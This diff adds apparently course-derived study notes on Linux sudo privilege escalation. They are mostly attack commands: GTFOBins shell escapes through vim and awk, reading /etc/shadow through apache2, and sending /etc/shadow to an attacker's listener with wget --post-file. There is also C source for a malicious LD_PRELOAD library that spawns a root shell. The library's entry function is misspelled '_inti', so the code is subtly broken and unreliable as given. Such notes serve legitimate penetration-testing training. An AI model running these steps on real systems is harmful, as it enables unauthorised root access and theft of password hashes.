@@ -1,0 +1,65 @@
+
+
+Sudo : It allow system administrator to delegate authority to give certain user or group of user 
+       to run some or all command as root. 
+	It allow to run command as root 
+
+1. Sudo Shell Escape : 
+	: sudo -l 
+	check all the binaries that listed against this resource
+	site : https://gtfobins.github.io/ 
+	sudo vim -c ':!/bin/sh'
+	sudo awk 'BEGIN {system("/bin/bash")}'
+	
+2. Exploiting Sudo with intended functionality : 
+	sudo -l 
+	if this is present : (root) NOPASSWD: /usr/sbin/apache2
+	then we can abuse this 
+	Now here we can not able to get shell but we can view system files 
+	sudo apache2 -f /etc/shadow
+	
+	now if this is present : (root) NOPASSWD : /usr/bin/wget 
+	Now we can abuse this by starting a netcat listener at kali machine 
+	now run 
+	sudo wget --post-file=/etc/shadow [KALI_IP]:[PORT] 
+	
+3. Using LD_PRELOAD : 
+	sudo -l 
+	output is showing env_keep+=LD_PRELOAD is set 
+	Matching Defaults entries for TCM on this host:
+        env_reset, env_keep+=LD_PRELOAD
+	
+What is LD_PRELOAD ?? ?
+
+LD_PRELOAD is also known as preloading, Preloading is a feature of (ld) which is a dynamic linker. so what were 
+doing is we are going to preloading a library user specific shared library for any other shared library is 
+loaded meaning we are going to run sudo with this LD_PRELOAD and we are going to run it on any command that 
+we want, so we are able to execute our own library and preload that before it runs anything else.  
+loading before all other libraries.
+so we make a malicious library 
+
+****************************
+#include<stdio.h>
+#include<sys/types.h>
+#include<stdlib.h>
+
+void _inti() { 
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");	
+}
+ 
+**************************
+
+copy this file as shell.c 
+
+compile it with gcc command : 
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+sudo LD_PRELOAD=/home/user/shell.so vim 
+
+:!bash
+
+
